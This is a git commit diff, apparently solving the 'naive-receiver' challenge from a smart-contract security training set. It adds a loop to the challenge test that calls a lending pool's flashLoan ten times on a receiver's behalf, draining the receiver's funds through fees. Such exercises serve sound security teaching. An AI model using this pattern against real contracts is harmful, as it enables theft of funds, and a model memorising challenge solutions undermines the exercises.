ec2db53488a1628d21602d4cce57c6d2f4197f4c
Elim <elimviolinist@gmail.com>
2022-02-24 13:04:18 -0800

    Solved naive-receiver

--- test/naive-receiver/naive-receiver.challenge.js
+++ test/naive-receiver/naive-receiver.challenge.js
@@ -31,6 +31,9 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        for (let i = 0; i < 10; i++) {
+            this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
+        }
     });
 
     after(async function () {
